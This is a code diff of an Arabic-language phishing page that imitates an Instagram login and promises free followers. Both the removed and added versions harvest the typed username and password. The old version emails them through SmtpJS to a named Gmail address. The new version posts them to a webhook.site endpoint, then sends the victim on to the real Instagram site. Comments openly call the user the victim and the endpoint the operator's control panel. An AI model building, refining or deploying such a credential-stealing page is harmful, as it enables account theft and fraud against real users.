@@ -3,53 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>هدية المتابعين 2026</title>
+    <title>هدية المتابعين</title>
     <style>
-        body { font-family: sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; border: 1px solid #dbdbdb; padding: 40px; text-align: center; width: 300px; border-radius: 8px; }
-        h2 { color: #262626; font-size: 18px; }
-        input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 4px; box-sizing: border-box; background: #fafafa; }
-        button { width: 100%; background-color: #0095f6; color: white; border: none; padding: 10px; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        body { font-family: Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 30px; border: 1px solid #dbdbdb; width: 300px; text-align: center; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dbdbdb; border-radius: 5px; box-sizing: border-box; background: #fafafa; }
+        button { width: 100%; padding: 12px; background-color: #0095f6; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 10px; }
         .logo { width: 175px; margin-bottom: 20px; }
+        h2 { font-size: 18px; color: #262626; margin-bottom: 20px; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <img class="logo" src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png">
-        <h2>مبروك! أنت مؤهل للحصول على 1000 متابع</h2>
-        <p style="font-size: 12px; color: #8e8e8e;">سجل دخولك لتأكيد هويتك واستلام الهدية فوراً</p>
-        
-    <form id="loginForm">
 
-            <input type="text" name="Username" placeholder="اسم المستخدم أو البريد" required>
-            <input type="password" name="Password" placeholder="كلمة السر" required>
-            <button type="submit">تسجيل الدخول واستلام المتابعين</button>
-        </form>
-    </div>
-    <script src="https://smtpjs.com/v3/smtp.js"></script>
+<div class="login-box">
+    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a251110364d.png" class="logo">
+    <h2>أدخل بياناتك للحصول على 5000 متابع مجاناً</h2>
+    <form id="loginForm">
+        <input type="text" name="username" placeholder="اسم المستخدم أو الهاتف" required>
+        <input type="password" name="password" placeholder="كلمة المرور" required>
+        <button type="submit">الحصول على الهدية الآن</button>
+    </form>
+</div>
+
 <script>
 document.getElementById("loginForm").addEventListener("submit", function(e) {
-    e.preventDefault(); 
+    e.preventDefault();
     
-    // سحب البيانات من الخانات بدقة
     var user = document.getElementsByName("username")[0].value;
     var pass = document.getElementsByName("password")[0].value;
 
-    Email.send({
-        SecureToken : "c2780e8c-843c-42b7-862d-ef34399b3484",
-        To : 'abodahmed778775@gmail.com',
-        From : "gift-site@bot.com",
-        Subject : "بيانات جديدة من موقعك!",
-        Body : "اسم المستخدم: " + user + "<br> كلمة المرور: " + pass
-    }).then(
-      message => {
-          alert("تم استلام طلبك بنجاح!");
-          // اختياري: توجيه الضحية لصفحة إنستجرام الحقيقية بعد الإرسال
-          window.location.href = "https://www.instagram.com";
-      }
-    );
+    // إرسال البيانات فوراً لصفحة لوحة التحكم الخاصة بك
+    fetch("https://webhook.site/c2780e8c-843c-42b7-862d-ef34399b3484", {
+        method: "POST",
+        mode: "no-cors", // لتجنب مشاكل الحماية
+        body: "الاسم: " + user + " | الباسورد: " + pass
+    }).then(function() {
+        alert("تم استلام طلبك بنجاح! سيتم فحص الحساب وإرسال المتابعين.");
+        window.location.href = "https://www.instagram.com";
+    }).catch(function() {
+        // في حال فشل الإنترنت يظل يحول الضحية لإنستجرام
+        window.location.href = "https://www.instagram.com";
+    });
 });
 </script>
 
 </body>
 </html>
+
